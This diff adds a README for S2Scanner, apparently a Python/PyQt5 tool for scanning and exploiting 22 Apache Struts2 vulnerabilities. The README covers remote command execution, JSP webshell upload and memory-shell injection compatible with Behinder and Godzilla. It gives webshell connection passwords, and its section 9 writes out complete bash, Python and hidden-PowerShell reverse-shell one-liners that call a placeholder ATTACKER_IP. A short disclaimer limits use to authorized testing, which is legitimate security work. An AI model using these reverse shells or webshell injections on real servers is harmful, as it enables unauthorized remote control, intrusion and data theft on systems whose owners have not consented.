@@ -1,0 +1,199 @@
+S2Scanner(v1.0)
+
+0x01.Introduction
+
+Overview
+
+S2Scanner(v1.0) is a comprehensive vulnerability scanning and exploitation tool for Apache Struts2 framework. It supports 22 known Struts2 vulnerabilities with features including batch scanning, command execution, web path retrieval, file upload, and memory shell injection.
+
+Features
+
+Vulnerability Scanning
+
+22 Supported Vulnerabilities (12 GET + 10 POST requests)
+Batch Scanning - Scan multiple URLs from a file
+Custom POST Parameters - Flexible parameter configuration with {exp} placeholder
+Multi-threaded Scanning - Fast and efficient scanning
+
+Command Execution
+
+Execute system commands on vulnerable targets
+Automatic GET/POST method detection
+Customizable POST parameters
+Cross-platform support (Windows/Linux/macOS)
+
+File Upload
+
+Upload JSP webshells to the target server
+Support for vulnerabilities: S2-001, S2-005, S2-045, S2-046
+Built-in JSP webshell generator with custom password
+
+Memory Shell Injection
+
+Inject memory-resident webshells (no file writes)
+Support for vulnerabilities: S2-001, S2-005, S2-045
+Compatible with popular tools: Behinder (Ice Scorpion) v3.0, Godzilla
+Custom command execution mode
+
+Web Path Retrieval
+
+Get real web application root paths
+Identify Tomcat installation directories
+
+0x02.Supported Vulnerabilities (22)
+
+GET Request Vulnerabilities (12)
+
+S2-003	GET
+S2-008	GET
+S2-009	GET
+S2-013	GET
+S2-015	GET
+S2-016	GET
+S2-019	GET
+S2-032	GET
+S2-033	GET
+S2-037	GET
+S2-057	GET
+S2-devMode	GET
+
+POST Request Vulnerabilities (10)
+
+S2-001	POST
+S2-005	POST
+S2-007	POST
+S2-012	POST
+S2-029	POST
+S2-045	POST
+S2-046	POST
+S2-048	POST
+S2-053	POST
+
+System Requirements
+
+Python: 3.6 or higher
+Dependencies: PyQt5, requests, urllib3
+OS: Windows / Linux / macOS
+
+0x03.Usage Guide
+
+1.Vulnerability Scan Tab
+
+Enter single URL or select URL list file
+Choose vulnerabilities to scan (select all or specific)
+Optional: Custom POST parameters using {exp} placeholder
+Click "Start Scan" to begin
+
+2.Command Execution Tab
+
+Enter target URL and select vulnerability type
+Input system commands (e.g., whoami, ls -la, dir)
+Click "Execute" to run commands
+
+3.File Upload Tab
+
+Select vulnerability type (S2-001, S2-005, S2-045, S2-046)
+Specify remote upload path
+Choose local JSP file or generate one
+Set webshell password
+Click "Upload File"
+
+4.Memory Shell Tab
+
+Select vulnerability type (S2-001, S2-005, S2-045)
+Choose memory shell type (Beinder/Godzilla/Custom)
+Click "Inject Memory Shell"
+
+5.Settings Tab
+
+Configure HTTP proxy
+Set timeout values
+Choose page encoding
+
+6.URL Format Support
+
+The tool accepts various URL formats:
+
+http://example.com/login.action
+https://192.168.1.1:8080/S2-001/index.action
+example.com:8080/user.action
+192.168.1.1/S2-005/example/HelloWorld.action
+
+7.Connection Examples
+
+Behinder (Ice Scorpion) v3.0
+
+URL: http://target.com/shell.jsp
+Password: e45e329feb5d925b
+
+Godzilla
+
+URL: http://target.com/shell.jsp
+Password: pass
+Key: (leave empty)
+Payload: JavaDynamicPayload
+Encoder: JAVA_AES_BASE64
+
+8.Custom Command Execution
+
+URL: http://target.com/shell.jsp?cmd=whoami
+
+9.Reverse Shell Commands
+
+Linux/macOS (with bash)
+
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+
+Linux/macOS (with python)
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+Windows (PowerShell)
+
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+10.Features by Vulnerability
+
+Vulnerability	Command Exec	Web Path	File Upload	Memory Shell
+S2-001		✅		✅		✅		✅
+S2-003		✅		❌		❌		❌
+S2-005		✅		✅		✅		✅
+S2-007		✅		❌		❌		❌
+S2-008		✅		❌		❌		❌
+S2-009		✅		❌		❌		❌
+S2-012		✅		❌		❌		❌
+S2-013		✅		✅		❌		❌
+S2-015		✅		❌		❌		❌
+S2-016		✅		✅		❌		❌
+S2-019		✅		✅		❌		❌
+S2-029		✅		❌		❌		❌
+S2-032		✅		✅		❌		❌
+S2-033		✅		❌		❌		❌
+S2-037		✅		✅		❌		❌
+S2-045		✅		✅		✅		✅
+S2-046		✅		❌		✅		❌
+S2-048		✅		❌		❌		❌
+S2-053		✅		❌		❌		❌
+S2-057		✅		❌		❌		❌
+S2-devMode	✅		✅		❌		❌
+
+11.Technical Details
+
+HTTP Protocol: Forces HTTP/1.0 (critical for original tool compatibility)
+SSL: Disables certificate verification for testing purposes
+Encoding: Supports UTF-8, GBK, GB2312
+Proxy: Supports HTTP proxy configuration
+
+12.Disclaimer
+
+This tool is for authorized security testing only. Users are responsible for complying with all applicable laws and regulations.
+The developer assumes no liability for any misuse or damage caused by this tool.
+
+13.License
+
+For educational and research purposes only.
+
+Version: 1.0
+Vulnerabilities: 22
+Language: Python3
+UI Framework: PyQt5
